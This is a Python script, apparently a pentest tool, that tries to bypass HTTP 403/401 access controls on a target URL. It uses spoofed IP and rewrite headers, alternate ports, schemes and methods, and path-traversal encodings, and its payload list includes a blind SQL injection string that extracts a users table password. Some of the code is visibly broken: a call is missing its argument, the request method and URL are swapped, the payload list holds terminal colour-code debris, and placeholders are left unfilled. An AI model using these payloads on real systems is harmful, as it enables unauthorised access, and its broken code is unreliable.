import argparse
import socket
import sys
import time
from urllib.parse import urlparse
from colorama import Fore, Style
import shutil
import requests

def usage():
    # ANSI color codes
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    blue = '\033[94m'
    end = '\033[0m'

    print("Usage:")
    print("\t403-bypass [URL]\n")
    print("\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n")

    print("BYPASS MODES")
    print("\t--header\t\t\tHeader Bypass")
    print("\t--protocol\t\t\tProtocol Bypass")
    print("\t--port\t\t\t\tPort Bypass")
    print("\t--HTTPmethod\t\t\tHTTP Method Bypass")
    print("\t--encode\t\t\tURL Encode Bypass")
    print("\t--SQLi\t\t\t\tMod_Security & libinjection Bypass\n")

    print("ALL BYPASSES")
    print("\t--exploit\t\t\tComplete Scan: 403/401 bypass modes\n")

    print(f"\t{green}GREEN{end}\t:\t{green}2xx Status Code{end}")
    print(f"\t{yellow}YELLOW{end}\t:\t{yellow}3xx Status Code{end}")
    print(f"\t{red}RED{end}\t:\t{red}4xx Status Code{end}")
    print(f"\t{blue}BLUE{end}\t:\t{blue}5xx Status Code{end}")

def Header_Bypass(domain, target,ip_list):
    term_width = shutil.get_terminal_size((80, 20)).columns
    user_agent = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
    }

    print(f"{Fore.BLUE}{'-' * 22}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] HTTP Header Bypass{Style.RESET_ALL}")
    print(f"{Fore.BLUE}{'-' * 22}{Style.RESET_ALL}")
    special_headers = [("Profile", f"http://{domain}"),("X-Arbitrary", f"http://{domain}"),("X-HTTP-DestinationURL", f"http://{domain}"),
          ("X-Forwarded-Proto", "http://${domain}"),  ("Referer", "${target}"),("X-Original-URL","/${path}"),("X-Rewrite-URL","/${path}"),("Content-Length","0"),("X-OReferrer","https%3A%2F%2Fwww.google.com%2F")]

    header_payloads = [
        "X-Originally-Forwarded-For",
        "X-Originating-",
        "X-Originating-IP",
        "True-Client-IP",
        "X-WAP-Profile",
        "From",
        "Destination",
        "Proxy",
        "CF-Connecting_IP",
        "CF-Connecting-IP",
        "X-Custom-IP-Authorization",
        "X-Custom-IP-Authorization",
        "X-Originating-IP",
        "X-Forwarded-For",
        "X-Remote-IP",
        "X-Client-IP",
        "X-Host",
        "X-Forwarded-Host",
        "X-ProxyUser-Ip",
        "Base-Url",
        "Client-IP",
        "Http-Url",
        "Proxy-Host",
        "Proxy-Url",
        "Real-Ip",
        "Redirect",
        "Referrer",
        "Request-Uri",
        "Uri",
        "Url",
        "X-Forward-For",
        "X-Forwarded-By",
        "X-Forwarded-For-Original",
        "X-Forwarded-Server",
        "X-Forwarded",
        "X-Forwarder-For",
        "X-Http-Destinationurl",
        "X-Http-Host-Override",
        "X-Original-Remote-Addr",
        "X-Proxy-Url",
        "X-Real-Ip",
        "X-Remote-Addr",
    ]

    for header_name in header_payloads:
        for ip in ip_list:
            print(f"{header_name} Payload:", end=' ')
            headers = user_agent.copy()
            value = f"{header_name}: {ip}"
            headers[header_name] = value

            try:
                response = requests.get(target, headers=headers, verify=False)
                print(f"Status: {response.status_code}, Length: {len(response.content)}")
                print(f"{'╭' + '─' * (term_width - 2)}╮")
                print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
                    f"{Fore.GREEN}curl -ks -H '{header_name}: {value}' -X GET '{target}' "
                    f"-H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
                print(f"{'╰' + '─' * (term_width - 2)}╯\n")
            except requests.RequestException as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

        for header_name, value in special_headers:
            print(f"{header_name} Payload:", end=' ')
            headers = user_agent.copy()
            headers[header_name] = value

            try:
                response = requests.get(target, headers=headers, verify=False)
                print(f"Status: {response.status_code}, Length: {len(response.content)}")
                print(f"{'╭' + '─' * (term_width - 2)}╮")
                print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
                    f"{Fore.GREEN}curl -ks -H '{header_name}: {value}' -X GET '{target}' "
                    f"-H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
                print(f"{'╰' + '─' * (term_width - 2)}╯\n")
            except requests.RequestException as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def Protocol_Bypass(domain, path, target):
    schemes = ["http", "https"]
    user_agent = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
    }
    term_width = shutil.get_terminal_size((80, 20)).columns

    print(f"{Fore.BLUE}{'-' * 25}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] Protocol Based Bypass{Style.RESET_ALL}")
    print(f"{Fore.BLUE}{'-' * 25}{Style.RESET_ALL}")

    # Try HTTP and HTTPS schemes directly
    for scheme in schemes:
        url = f"{scheme}://{domain}/{path}"
        print(f"{scheme.upper()} Scheme Payload:", end=' ')
        try:
            response = requests.get(url, headers=user_agent, verify=False, allow_redirects=True)
            print(f"Status: {response.status_code}, Length: {len(response.content)}")
            print(f"{'╭' + '─' * (term_width - 2)}╮")
            print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
                  f"{Fore.GREEN}curl -ks -X GET '{url}' -H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
            print(f"{'╰' + '─' * (term_width - 2)}╯\n")
        except requests.RequestException as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

    # X-Forwarded-Scheme header-based
    for scheme in schemes:
        headers = user_agent.copy()
        headers["X-Forwarded-Scheme"] = scheme
        print(f"X-Forwarded-Scheme {scheme.upper()} Payload:", end=' ')
        try:
            response = requests.get(target, headers=headers, verify=False, allow_redirects=True)
            print(f"Status: {response.status_code}, Length: {len(response.content)}")
            print(f"{'╭' + '─' * (term_width - 2)}╮")
            print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
                  f"{Fore.GREEN}curl -ks -H 'X-Forwarded-Scheme: {scheme}' -X GET '{target}' "
                  f"-H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
            print(f"{'╰' + '─' * (term_width - 2)}╯\n")
        except requests.RequestException as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def Port_Bypass(target):
    ports = [443, 4443, 80, 8080, 8443]
    user_agent = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
    }

    term_width = shutil.get_terminal_size((80, 20)).columns

    print(f"{Fore.BLUE}{'-' * 25}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] Port Based Bypass{Style.RESET_ALL}")
    print(f"{Fore.BLUE}{'-' * 25}{Style.RESET_ALL}")

    for port in ports:
        headers = user_agent.copy()
        headers["X-Forwarded-Port"] = str(port)

        print(f"X-Forwarded-Port {port} Payload:", end=' ')
        try:
            response = requests.get(target, headers=headers, allow_redirects=True, verify=False)
            print(f"Status: {response.status_code}, Length: {len(response.content)}")

            # cURL payload box
            print(f"{'╭' + '─' * (term_width - 2)}╮")
            print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
                  f"{Fore.GREEN}curl -ks -H 'X-Forwarded-Port: {port}' -X GET '{target}' -H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
            print(f"{'╰' + '─' * (term_width - 2)}╯\n")
        except requests.RequestException as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def HTTP_Method_Bypass(target):

    user_agent = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
    }

    methods = [
        "GET", "POST", "HEAD", "OPTIONS", "PUT", "TRACE",
        "PATCH", "TRACK", "CONNECT", "UPDATE", "LOCK"
    ]

    # Terminal width for fancy payload box
    term_width = shutil.get_terminal_size((80, 20)).columns

    print(f"{Fore.BLUE}{'-' * 22}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] HTTP Method Bypass{Style.RESET_ALL}")
    print(f"{Fore.BLUE}{'-' * 22}{Style.RESET_ALL}")

    for method in methods:
        print(f"{method:<8}: ", end='')
        try:
            response = requests.request(
                method,
                target,
                headers=user_agent,
                allow_redirects=True,
                verify=False
            )
            print(f"Status: {response.status_code}, Length: {len(response.content)}")

            # Print equivalent cURL payload
            print(f"{'╭' + '─' * (term_width - 2)}╮")
            print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : {Fore.GREEN}curl -ks '{target}' -L -H 'User-Agent: Mozilla/5.0' -X {method}{Style.RESET_ALL}")
            print(f"{'╰' + '─' * (term_width - 2)}╯\n")

        except requests.RequestException as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
def URL_Encode_Bypass(target):
    user_agent = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
    }
    bypasses = ['m', 'm', 'm', 'm', 'm', 'm', ';5;208m', ';5;016m', ";5;038m'${black", '', '', '', '', '', '', '', '', '0', '09%3', '09.', '09', '2', '23%3', '252f%252', '252f', '2e%2', '2e%2e', '2', '2f%20%2', '2f%2', '2f%2', '2f%3b%2', '2f%3b%2f%2', '2f%3', '2f%3f', '2f', '3', '3b%0', '3b%2f%2e%2', '3b%2f%2e%2e%2f%2e%2e%2f%2', '3b%2f%2e', '3b%2f.', '3b/%2e%2e/..%2f%2', '3b/%2e', '3b/%2f%2f..', '3b/.', '3b//%2f..', '3f%2', '3f%3', '', '.%00/', '.%00;', '.%0', '.%0d/', '.%0d;', '.%5c', '.%ff/', '.%ff;', '.;%00', '.;%0d', '.;%ff', '.;', '.;\\', '.\\', '%20', '%20%2', '%252e%252e%252f', '%252e%252e%253b', '%252e%252f', '%252e%253b', '%252e', '%252', '%2e%2', '%2e%2e%3b', '%2e%2e', '%2e%2f', '%2e%3b', '%2e%3b/', '%2e', '%2e/', '%2', '%3b', '.', '..%2', '..%2f..%2', '..%2f..%2f..%2', '..', '../..', '../../..', '../../../', '../../', '../..//..', '../..;', '.././..', '../.;/..', '../', '..//..', '..//../..', '..//..;', '../;', '../;/..', '..;%2', '..;%2f..;%2', '..;%2f..;%2f..;%2', '..;/..', '..;/..;', '..;/', '..;//..', '..;//..;', '..;/;', '..;/;/..;', './', '.;', '.;/', '/.', '/../..', '/..', '/.', '/.;', '//.', '//..', '//../', '//..', '//..;', '//..;/', '/;', ';', ';/', ';', ';x', 'x/..', 'x/../', 'x/../;', 'x/..;', 'x/..;/', 'x/..;/;', 'x//..', 'x//..;', 'x/;/..', 'x/;/..;', '', '%0', '%09.', '%09..', '%09', '%2F.', '%2f%2e%2', '%2f%2e%2e%2f%2e%2e%2f%2', '%2f%2f/..', '%2f.', '%2f..%2f%2e%2e%2f%2', '%2f..%2f..%2f%2', '%2f..%2f', '%2f..%2f/..%2', '%2f..%2f/..', '%2f../%2f..%2', '%2f../%2f..', '%2f..//..%2', '%2f..//..', '%2f..//', '%2f..///', '%2f..//;', '%2f..//;/', '%2f../;/', '%2f../;/;', '%2f../;/;/', '%2f..;//', '%2f..;//;', '%2f..;/;/', '%2f/%2f..', '%2f//..%2', '%2f//..', '%2f//..;', '%2f/;/..', '%2f/;/..;', '%2f;//..', '%2f;/;/..;', '/%2e%2', '/%2e%2e%2f%2', '/%2e%2e%2f', '/%2e%2e', '/%2e', '/%2f%2f..', '/%2f/..%2', '/%2f/..', '/.%2', '/.%2e/%2e%2e/%2', '/.', '/..%2', '/..%2f%2f..', '/..%2f..%2', '/..%2f', '/..%2f/', '/..', '/../%2f', '/../..', '/../../', '/.././..', '/../.;/..', '/../', '/..//%2e%2e', '/..//%2', '/..//..', '/..//', '/../;', '/../;/..', '/..', '/.;', '//%2f..', '//.', '//../..', '///.', '///..', '///../', '', 'x', 'x', '', '', '0', '.', './%2', './.', '.%00', '.%0d', '.%5', '.', '.%ff', '2e%2e%2', '%2e', '3', '2', '2', '2', '', '', '', '?', '', '.', '//.', '/?anythin', '', '', '.randomstrin', '.;', 'htm', '20', '20${path}%20', 'jso', '..\\.', '', '/', '*', '..;', 'e/${path', '%2e', '/', '//', '..', '${path}', '', ' or 1.e(\\")=', '.e(asci', '.e(substring', ".e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='"]
    # Terminal width for fancy payload box
    term_width = shutil.get_terminal_size((80, 20)).columns

    print(f"{Fore.BLUE}{'-' * 22}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] URL Encode Bypass {Style.RESET_ALL}")
    print(f"{Fore.BLUE}{'-' * 22}{Style.RESET_ALL}")

    for bypass in bypasses:
        print(f"{bypass:<8}: ", end='')
        try:
            response = requests.request(
                target+bypass,
                headers=user_agent,
                allow_redirects=True,
                verify=False
            )
            print(f"Status: {response.status_code}, Length: {len(response.content)}")

            # Print equivalent cURL payload
            print(f"{'╭' + '─' * (term_width - 2)}╮")
            print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : {Fore.GREEN}curl -ks '{target}' -L -H 'User-Agent: Mozilla/5.0' -X GET {Style.RESET_ALL}")
            print(f"{'╰' + '─' * (term_width - 2)}╯\n")

        except requests.RequestException as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def Exploit_403_Bypass(domain,path,target,ip_list):
    Header_Bypass(domain, target,ip_list)
    Protocol_Bypass(domain, path, target)
    Port_Bypass(target)
    HTTP_Method_Bypass(target)
    URL_Encode_Bypass(target)
    print(f"{Fore.BLUE}{'-' * 22}{Style.RESET_ALL}")


# ---------- Main logic ----------

def resolve_ip(domain):
    try:
        ip = socket.gethostbyname(domain)
        return str(ip)
    except socket.gaierror:
        return None


def main():
    parser = argparse.ArgumentParser(description="Pentest bypass tool")

    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://site.com/path)')
    parser.add_argument('--header', action='store_true', help='Header-based bypass')
    parser.add_argument('--protocol', action='store_true', help='Protocol-based bypass')
    parser.add_argument('--port', action='store_true', help='Port-based bypass')
    parser.add_argument('--HTTPmethod', action='store_true', help='HTTP method bypass')
    parser.add_argument('--encode', action='store_true', help='URL encoding bypass')
    parser.add_argument('--exploit', action='store_true', help='Run general exploit/403 bypass')
    parser.add_argument('--delay', type=float, default=0.0, help='Optional delay between requests (in seconds)')
    parser.add_argument('--tryhard', action='store_true', help='Use lots of different ip to try to bypass it')


    args = parser.parse_args()

    parsed_url = urlparse(args.url)
    if not parsed_url.scheme or not parsed_url.netloc:
        usage()
        sys.exit(1)

    domain = parsed_url.netloc
    path = parsed_url.path or '/'
    ip = resolve_ip(domain)

    if not ip:
        print(f"[!] Could not resolve IP for domain: {domain}")

        ip="*"

    print(f"[*] Target: {args.url}")
    print(f"[*] Domain: {domain}")
    print(f"[*] Path: {path}")
    print(f"[*] IP: {ip}")
    print(f"[*] Delay: {args.delay} seconds")

    time.sleep(args.delay)
    if args.tryhard:
        ip_list = ["${website_ip}", "127.0.0.1", "*", "8.8.8.8", "null", "192.168.0.2", "10.0.0.1", "0.0.0.0", "localhost", "192.168.1.1"]
    else:
        ip_list = ["127.0.0.1"]
    if args.header:
        Header_Bypass(domain, args.url,ip_list)
    elif args.protocol:
        Protocol_Bypass(domain, path, args.url)
    elif args.port:
        Port_Bypass()
    elif args.HTTPmethod:
        HTTP_Method_Bypass(args.url)
    elif args.encode:
        URL_Encode_Bypass(args.url)
    elif args.exploit:
        Exploit_403_Bypass(domain, path, args.url,ip_list)
    else:
        print("[!] No mode selected. Use --help to view available options.")
        sys.exit(1)


if __name__ == "__main__":
    main()
